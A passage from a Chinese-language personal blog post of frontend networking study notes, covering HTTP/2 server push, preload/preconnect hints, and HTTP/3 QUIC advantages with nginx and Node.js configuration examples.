    Server-&gt;&gt;Client: 推送关键CSS（PUSH_PROMISE帧）
    Server-&gt;&gt;Client: 并行传输HTML+CSS+JS（多DATA帧）
    Client-&gt;&gt;Browser: 流优先级排序 -&gt; 快速渲染</code></pre>

<p><strong>实战优化策略</strong></p>
<p>(1) 压缩策略组合</p>
<ul>
<li>静态资源：预压缩Brotli（.br后缀） + 备用Gzip</li>
<li>动态内容：实时Gzip压缩（CPU消耗低）</li>
</ul>
<p>(2) HTTP&#x2F;2 最佳实践</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment"># 强制启用HTTP/2</span>
<span class="token directive"><span class="token keyword">listen</span> <span class="token number">443</span> ssl http2</span><span class="token punctuation">;</span> 

<span class="token comment"># 启用服务器推送（需谨慎）</span>
<span class="token directive"><span class="token keyword">http2_push</span> /style.css</span><span class="token punctuation">;</span> 
<span class="token directive"><span class="token keyword">http2_push</span> /app.js</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(3) 资源加载优化</p>
<ul>
<li>减少域名分片（HTTP&#x2F;2下单域名更高效）</li>
<li>图片懒加载 + 异步加载非关键JS</li>
</ul>
<h3 id="预加载（preload）与预连接（preconnect）"><a href="#预加载（preload）与预连接（preconnect）" class="headerlink" title="预加载（preload）与预连接（preconnect）"></a>预加载（preload）与预连接（preconnect）</h3><p><strong>预加载（preload）</strong></p>
<p>核心作用：强制提前加载关键渲染资源，突破浏览器默认优先级限制，加速关键路径渲染。</p>
<pre><code class="mermaid">graph LR
  A[HTML解析] --&gt; B&#123;发现 preload 标签&#125;
  B --&gt;|立即请求| C[关键资源]
  C --&gt; D[提前加载完成]
  D --&gt; E[页面渲染直接使用]</code></pre>

<p>实现方式：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 基本用法 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preload<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>font.woff2<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>font<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>font/woff2<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preload<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>critical.css<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preload<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main.js<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http">&lt;!-- HTTP响应头方式（优先级更高） -->
<span class="token header"><span class="token header-name keyword">Link</span><span class="token punctuation">:</span> <span class="token header-value">&lt;/critical.css>; rel=preload; as=style</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>关键特性：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">作用</th>
<th align="left">必填项</th>
</tr>
</thead>
<tbody><tr>
<td align="left">href</td>
<td align="left">资源路径</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">as</td>
<td align="left">资源类型（font&#x2F;script&#x2F;style）</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">MIME类型（如font&#x2F;woff2）</td>
<td align="left">推荐</td>
</tr>
<tr>
<td align="left">crossorigin</td>
<td align="left">跨域资源必须</td>
<td align="left">条件</td>
</tr>
<tr>
<td align="left">fetchpriority</td>
<td align="left">优先级控制（high&#x2F;low）</td>
<td align="left">Chrome</td>
</tr>
</tbody></table>
<p>适用场景：</p>
<ul>
<li>首屏关键CSS：避免渲染阻塞</li>
<li>自定义字体：消除FOIT（字体未加载时的空白）</li>
<li>首屏图片：LCP（最大内容绘制）优化</li>
<li>核心框架JS：提前解析编译</li>
</ul>
<p><strong>预连接（preconnect）</strong></p>
<p>核心作用：提前完成跨域连接的握手阶段，节省DNS+TCP+TLS时间（约100-500ms）。</p>
<pre><code class="mermaid">sequenceDiagram
    participant Browser
    participant CDN as 第三方服务器

    Browser-&gt;&gt;Browser: 解析HTML发现preconnect
    Browser-&gt;&gt;CDN: 1. DNS解析
    Browser-&gt;&gt;CDN: 2. TCP握手
    Browser-&gt;&gt;CDN: 3. TLS协商
    Note over Browser,CDN: 连接就绪（节省3次RTT）
    Browser-&gt;&gt;CDN: 实际资源请求（立即发送）</code></pre>

<p>实现方式：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 预连接第三方源 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://api.example.com<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- DNS预取（更轻量） --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns-prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//cdn.example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键属性：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">href</td>
<td align="left">目标域名（无路径）</td>
</tr>
<tr>
<td align="left">crossorigin</td>
<td align="left">需凭证的资源必须设置</td>
</tr>
</tbody></table>
<p>适用场景：</p>
<ul>
<li>CDN资源域：静态资源加载</li>
<li>API接口域：AJAX请求优化</li>
<li>分析统计域：Google Analytics等</li>
<li>第三方组件：社交媒体插件</li>
</ul>
<p><strong>对比决策指南</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">preload</th>
<th align="left">preconnect</th>
</tr>
</thead>
<tbody><tr>
<td align="left">优化目标</td>
<td align="left">资源本身</td>
<td align="left">网络连接</td>
</tr>
<tr>
<td align="left">网络消耗</td>
<td align="left">高（传输资源内容）</td>
<td align="left">低（仅握手）</td>
</tr>
<tr>
<td align="left">执行时机</td>
<td align="left">立即下载资源</td>
<td align="left">建立连接池备用</td>
</tr>
<tr>
<td align="left">最佳适用</td>
<td align="left">已知URL的关键渲染资源</td>
<td align="left">未知URL的第三方域</td>
</tr>
<tr>
<td align="left">优先级</td>
<td align="left">非常高（强制加载）</td>
<td align="left">高</td>
</tr>
<tr>
<td align="left">浏览器支持</td>
<td align="left">Chrome&gt;58, Firefox&gt;56, Safari&gt;11</td>
<td align="left">Chrome&gt;46, Firefox&gt;39, Safari&gt;11</td>
</tr>
</tbody></table>
<h2 id="4-3-协议升级"><a href="#4-3-协议升级" class="headerlink" title="4.3 协议升级"></a>4.3 协议升级</h2><h3 id="HTTP-2服务端推送（Server-Push）"><a href="#HTTP-2服务端推送（Server-Push）" class="headerlink" title="HTTP&#x2F;2服务端推送（Server Push）"></a>HTTP&#x2F;2服务端推送（Server Push）</h3><p><strong>核心原理</strong></p>
<p>服务端在响应主资源请求时，主动推送关联子资源到浏览器缓存，消除传统”请求-响应”链的串行延迟。</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client as 客户端
    participant Server as 服务器

    Client-&gt;&gt;Server: 请求HTML文档 (GET &#x2F;index.html)
    Server-&gt;&gt;Server: 解析HTML依赖 (CSS&#x2F;JS&#x2F;图片)
    Server-&gt;&gt;Client: 响应HTML + PUSH_PROMISE帧 (承诺推送&#x2F;css&#x2F;style.css)
    Server-&gt;&gt;Client: 推送CSS文件 (DATA帧)
    Server-&gt;&gt;Client: 推送JS文件 (PUSH_PROMISE + DATA)
    Client-&gt;&gt;Client: 从缓存直接加载推送资源
    Note over Client: 渲染无需等待后续请求</code></pre>

<p><strong>与传统加载对比</strong></p>
<table>
<thead>
<tr>
<th align="left">阶段</th>
<th align="left">HTTP&#x2F;1.1</th>
<th align="left">HTTP&#x2F;2 + Server Push</th>
</tr>
</thead>
<tbody><tr>
<td align="left">首次请求</td>
<td align="left">获取HTML</td>
<td align="left">获取HTML</td>
</tr>
<tr>
<td align="left">发现子资源</td>
<td align="left">解析HTML → 发起CSS&#x2F;JS请求</td>
<td align="left">无需请求（已推送至缓存）</td>
</tr>
<tr>
<td align="left">资源传输</td>
<td align="left">顺序等待（队头阻塞）</td>
<td align="left">并行传输</td>
</tr>
<tr>
<td align="left">渲染开始</td>
<td align="left">300-500ms</td>
<td align="left">0ms（CSS已就绪）</td>
</tr>
</tbody></table>
<p><strong>技术实现详解</strong></p>
<p>(1) 推送触发条件</p>
<ul>
<li>显式配置（开发者指定）</li>
</ul>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment"># Nginx配置</span>
<span class="token directive"><span class="token keyword">http2_push</span> /static/style.css</span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">http2_push_preload</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>  <span class="token comment"># 解析Link头部</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>隐式触发（需启用<code>http2_push_preload</code>）</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"># 响应头声明需推送资源
<span class="token header"><span class="token header-name keyword">Link</span><span class="token punctuation">:</span> <span class="token header-value">&lt;/static/script.js>; rel=preload; as=script</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>(2) 推送协议流程</p>
<ul>
<li>发送 PUSH_PROMISE帧<ul>
<li>包含欲推送资源的请求头（:path&#x2F;:authority）</li>
<li>承诺的 流ID 为偶数（区分客户端请求的奇数流）</li>
</ul>
</li>
<li>推送 HEADERS+DATA帧<ul>
<li>在原始响应流完成前发送推送资源</li>
</ul>
</li>
<li>客户端 缓存管理<ul>
<li>浏览器验证缓存有效性（类似常规请求）</li>
</ul>
</li>
</ul>
<p>(3) 客户端控制机制</p>
<ul>
<li>接受推送：默认自动缓存（除非缓存头禁止）</li>
<li>拒绝推送：发送 RST_STREAM帧（场景：资源已缓存）</li>
</ul>
<pre><code class="mermaid">sequenceDiagram
    Server-&gt;&gt;Client: PUSH_PROMISE (流ID:2)
    alt 客户端需要该资源
        Client--&gt;&gt;Server: 无操作（接受推送）
    else 资源已缓存
        Client-&gt;&gt;Server: RST_STREAM (流ID:2)
    end</code></pre>

<p><strong>性能优化场景</strong></p>
<table>
<thead>
<tr>
<th align="left">场景</th>
<th align="left">传统方式问题</th>
<th align="left">Server Push解决方案</th>
</tr>
</thead>
<tbody><tr>
<td align="left">关键CSS阻塞渲染</td>
<td align="left">需往返请求 → 延迟渲染</td>
<td align="left">推送CSS → 实现”0-RTT渲染”</td>
</tr>
<tr>
<td align="left">字体加载空白(FOIT)</td>
<td align="left">文字延迟显示</td>
<td align="left">推送字体文件 → 消除布局偏移</td>
</tr>
<tr>
<td align="left">首屏图片(LCP)</td>
<td align="left">图片请求靠后 → LCP延迟</td>
<td align="left">推送英雄图 → 加速LCP</td>
</tr>
</tbody></table>
<p><strong>配置最佳实践：Node.js 实现</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http2 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> server <span class="token operator">=</span> http2<span class="token punctuation">.</span><span class="token function">createSecureServer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> cert<span class="token punctuation">,</span> key <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'stream'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">stream<span class="token punctuation">,</span> headers</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">':path'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'/index.html'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 推送CSS</span>
    stream<span class="token punctuation">.</span><span class="token function">pushStream</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token string-property property">':path'</span><span class="token operator">:</span> <span class="token string">'/style.css'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">pushStream</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      pushStream<span class="token punctuation">.</span><span class="token function">respondWithFile</span><span class="token punctuation">(</span><span class="token string">'style.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'text/css'</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 响应HTML</span>
    stream<span class="token punctuation">.</span><span class="token function">respondWithFile</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>黄金法则</strong></p>
<ul>
<li>仅推送关键渲染资源<ul>
<li>首屏CSS</li>
<li>阻塞渲染JS</li>
<li>LCP图片</li>
</ul>
</li>
<li>体积控制<ul>
<li>单页推送资源≤30KB</li>
<li>总推送量≤100KB（避免队头阻塞）</li>
</ul>
</li>
<li>缓存感知<ul>
<li>结合 Cache-Digest 草案（暂未普及）</li>
<li>短TTL资源避免推送（如个性化内容）</li>
</ul>
</li>
</ul>
<p><strong>浏览器支持与限制</strong></p>
<table>
<thead>
<tr>
<th align="left">浏览器</th>
<th align="left">支持版本</th>
<th align="left">特殊限制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Chrome</td>
<td align="left">49+</td>
<td align="left">需HTTPS</td>
</tr>
<tr>
<td align="left">Firefox</td>
<td align="left">44+</td>
<td align="left">允许HTTP推送（非标准）</td>
</tr>
<tr>
<td align="left">Safari</td>
<td align="left">不支持</td>
<td align="left">技术路线转向103 Early Hints</td>
</tr>
<tr>
<td align="left">Edge</td>
<td align="left">12+</td>
<td align="left">同Chromium</td>
</tr>
</tbody></table>
<h3 id="HTTP-3的QUIC协议优势"><a href="#HTTP-3的QUIC协议优势" class="headerlink" title="HTTP&#x2F;3的QUIC协议优势"></a>HTTP&#x2F;3的QUIC协议优势</h3><p><strong>QUIC协议核心优势</strong></p>
<p>(1) 连接建立优化（0-1 RTT）</p>
<ul>
<li>首次连接：QUIC合并传输层与加密层握手 → 1-RTT完成连接+TLS协商（对比TCP+TLS的2-3 RTT）</li>
<li>会话恢复：支持0-RTT握手，客户端缓存密钥后可直接发送数据（如重复访问用户瞬间加载资源）</li>
</ul>
<pre><code class="mermaid">sequenceDiagram
    客户端-&gt;&gt;服务器: 首次请求 (1-RTT)
    服务器-&gt;&gt;客户端: 返回加密密钥（缓存）
    客户端-&gt;&gt;服务器: 后续请求 (0-RTT + 应用数据)</code></pre>

<p>(2) 彻底解决队头阻塞（HOL Blocking）</p>
<ul>
<li>HTTP&#x2F;2问题：基于TCP的多路复用中，单个包丢失会阻塞所有流</li>
<li>QUIC方案：在UDP上实现独立流控制，每个流单独处理丢包重传 → 包丢失仅影响当前流，其他流正常传输</li>
</ul>
<p>(3) 无缝连接迁移</p>
<ul>
<li>传统TCP问题：网络切换（如Wi-Fi→4G）导致连接中断 → 需重新握手</li>
<li>QUIC方案：通过Connection ID标识连接（非IP&#x2F;端口四元组） → 网络切换时连接保持活跃</li>
</ul>
<p>(4) 默认强加密与安全性</p>
<ul>
<li>强制TLS 1.3：所有QUIC流量默认加密，支持前向保密（PFS） → 即使密钥泄露，历史数据仍安全</li>
<li>抗重放攻击：通过单次密钥派生值验证，拒绝重复请求 </li>
<li>防协议降级：集成TLS 1.3的抗降级机制，阻止中间人强制低版本加密</li>
</ul>
<p>(5) 拥塞控制优化</p>
<ul>
<li>动态算法：内置BBR（Bottleneck Bandwidth and Round-trip）算法 → 高延迟网络中吞吐量提升30%+</li>
<li>用户态实现：协议栈位于应用层（非内核），可快速迭代拥塞算法</li>
</ul>
<p>(6) 头部压缩与传输效率</p>
<ul>
<li>QPACK压缩：改进HTTP&#x2F;2的HPACK，支持乱序编码 → 减少30%头部开销。</li>
<li>前向纠错（FEC）：添加冗余数据包，少量丢包时无需重传 → 弱网下视频卡顿率降低50%</li>
</ul>
<p><strong>QUIC vs TCP&#x2F;TLS 关键对比</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">TCP&#x2F;TLS（HTTP&#x2F;2）</th>
<th align="left">QUIC（HTTP&#x2F;3）</th>
<th align="left">前端影响</th>
</tr>
</thead>
<tbody><tr>
<td align="left">连接建立</td>
<td align="left">2-3 RTT</td>
<td align="left">0-1 RTT</td>
<td align="left">LCP时间↓34%</td>
</tr>
<tr>
<td align="left">多路复用</td>
<td align="left">流级阻塞</td>
<td align="left">包级独立</td>
<td align="left">FCP稳定性↑</td>
</tr>
<tr>
<td align="left">网络切换</td>
<td align="left">连接中断</td>
<td align="left">无缝迁移</td>
<td align="left">移动端跳出率↓</td>
</tr>
<tr>
<td align="left">加密机制	可选TLS	强制TLS 1.3	混合内容风险消除</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">部署灵活性</td>
<td align="left">依赖操作系统内核</td>
<td align="left">用户态协议栈</td>
<td align="left">快速拥塞算法更新</td>
</tr>
</tbody></table>
<p><strong>前端性能优化实践</strong></p>
<ul>
<li>优先关键资源：<ul>
<li>HTTP&#x2F;3下无需过度域名分片（单连接多流独立），集中CDN域名提升缓存命中率。</li>
</ul>
</li>
<li>0-RTT会话利用：<ul>
<li>静态资源设置长缓存 (Cache-Control: immutable)，匹配0-RTT快速加载 4。</li>
</ul>
</li>
<li>监控协议升级：</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 查看浏览器Network面板Protocol列</span>
performance<span class="token punctuation">.</span><span class="token function">getEntriesByType</span><span class="token punctuation">(</span><span class="token string">"resource"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>nextHopProtocol <span class="token operator">===</span> <span class="token string">"h3"</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"HTTP/3 used"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>降级兼容方案：<ul>
<li>服务器同时监听HTTP&#x2F;2与HTTP&#x2F;3，Alt-Svc头自动协商协议：</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Alt-Svc</span><span class="token punctuation">:</span> <span class="token header-value">h3=":443"; ma=2592000; v="46,43"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="五、高级网络技术"><a href="#五、高级网络技术" class="headerlink" title="五、高级网络技术"></a>五、高级网络技术</h1><h2 id="5-1-API设计规范"><a href="#5-1-API设计规范" class="headerlink" title="5.1 API设计规范"></a>5.1 API设计规范</h2><h3 id="RESTful架构原则（资源化-状态转移）"><a href="#RESTful架构原则（资源化-状态转移）" class="headerlink" title="RESTful架构原则（资源化&#x2F;状态转移）"></a>RESTful架构原则（资源化&#x2F;状态转移）</h3><h3 id="GraphQL查询与REST对比"><a href="#GraphQL查询与REST对比" class="headerlink" title="GraphQL查询与REST对比"></a>GraphQL查询与REST对比</h3><h2 id="5-2-调试与监控"><a href="#5-2-调试与监控" class="headerlink" title="5.2 调试与监控"></a>5.2 调试与监控</h2><h3 id="浏览器Network面板分析（Waterfall-Timing）"><a href="#浏览器Network面板分析（Waterfall-Timing）" class="headerlink" title="浏览器Network面板分析（Waterfall&#x2F;Timing）"></a>浏览器Network面板分析（Waterfall&#x2F;Timing）</h3><h3 id="性能指标（TTFB-LCP-FCP）监控"><a href="#性能指标（TTFB-LCP-FCP）监控" class="headerlink" title="性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控"></a>性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控</h3><h2 id="5-3-新兴技术"><a href="#5-3-新兴技术" class="headerlink" title="5.3 新兴技术"></a>5.3 新兴技术</h2><h3 id="WebRTC基础（P2P通信-信令服务）"><a href="#WebRTC基础（P2P通信-信令服务）" class="headerlink" title="WebRTC基础（P2P通信&#x2F;信令服务）"></a>WebRTC基础（P2P通信&#x2F;信令服务）</h3><h3 id="WebTransport协议探索"><a href="#WebTransport协议探索" class="headerlink" title="WebTransport协议探索"></a>WebTransport协议探索</h3>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Network/" rel="tag"><i class="fa fa-tag"></i> Network</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/06/19/JavaScript%20Study%20Notes/" rel="prev" title="JavaScript 专题知识学习">
                  <i class="fa fa-angle-left"></i> JavaScript 专题知识学习
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/06/21/JavaScript%20Prototype/" rel="next" title="JavaScript 原型&#x2F;原型链专题知识学习">
                  JavaScript 原型/原型链专题知识学习 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Ariel</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">210k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">12:45</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/tianfei92" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
